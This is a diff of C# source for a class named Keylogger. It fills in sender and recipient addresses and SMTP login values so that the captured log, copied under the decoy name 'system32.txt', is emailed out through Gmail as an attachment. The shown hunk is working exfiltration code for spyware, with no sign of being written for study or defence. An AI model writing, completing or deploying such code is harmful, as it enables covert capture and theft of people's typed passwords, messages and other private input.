@@ -173,8 +173,8 @@ class Keylogger
         string filePath1 = folderName + @"\system32.txt";
         System.IO.File.Copy(filePath, filePath1, true);
 
-        mittente= ""
-        destinatario = ""
+        String mittente= "aaa@gmail.com";
+        String destinatario = "bbb@gmail.com";
         SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
         MailMessage mailMessage = new MailMessage();
         mailMessage.From = new MailAddress(mittente);
@@ -182,7 +182,7 @@ class Keylogger
         mailMessage.Subject = "Output KeyLogger";
         client.UseDefaultCredentials = false;
         client.EnableSsl = true;
-        client.Credentials = new System.Net.NetworkCredential("email", "password");
+        client.Credentials = new System.Net.NetworkCredential("aaa@gmail.com", "boh");
         mailMessage.Body = "Hi! Ecco qua il file di testo :D\n";
         mailMessage.Attachments.Add(new Attachment(filePath1));
         client.Send(mailMessage);
